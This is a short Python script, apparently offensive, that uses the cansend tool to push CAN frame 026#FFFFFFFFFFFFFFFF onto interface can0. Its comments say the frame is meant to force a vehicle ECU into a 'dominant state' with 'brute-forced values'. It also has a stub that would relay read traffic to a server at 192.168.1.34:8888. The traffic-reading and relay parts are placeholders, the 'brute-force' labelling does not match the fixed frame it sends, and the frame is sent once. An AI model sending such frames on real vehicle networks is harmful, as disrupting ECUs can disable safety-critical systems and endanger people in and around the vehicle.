import os
import subprocess
import time

# Timer variables
previous_time = 0
interval = 0.04  # Interval in seconds (40 milliseconds)

def send_can_message(message_id, data):
    # Format the message
    message = f"{message_id}#{data}"
    # Use subprocess to execute cansend command
    subprocess.run(["cansend", "can0", message])

# Send CAN message to force ECU into dominant state
def send_force_dominant_message():
    # Define CAN message to force ECU into dominant state
    dominant_message = "026#FFFFFFFFFFFFFFFF"
    send_can_message("026", "FFFFFFFFFFFFFFFF")
    print("Sent dominant message: 026#FFFFFFFFFFFFFFFF")

# Send CAN message with brute-forced values
def send_messages():
    global previous_time
    # Check if it's time to send the CAN message
    if time.time() - previous_time >= interval:
        # Save the last time a CAN message was sent
        previous_time = time.time()
        # Send the force dominant message
        send_force_dominant_message()
    else:
        # Read CAN traffic
        received_message = "Read message"
        print(f"Received message: {received_message}")
        # Relay data to server (if needed)
        relay_data_to_server(received_message)

# Relay data to server
def relay_data_to_server(message):
    # Connect to the server
    server_ip = "192.168.1.34"
    server_port = 8888
    # Send data to server
    print(f"Relaying data to server: {message}")
    # You can implement sending data to the server here

# Execute the send_messages function
send_messages()
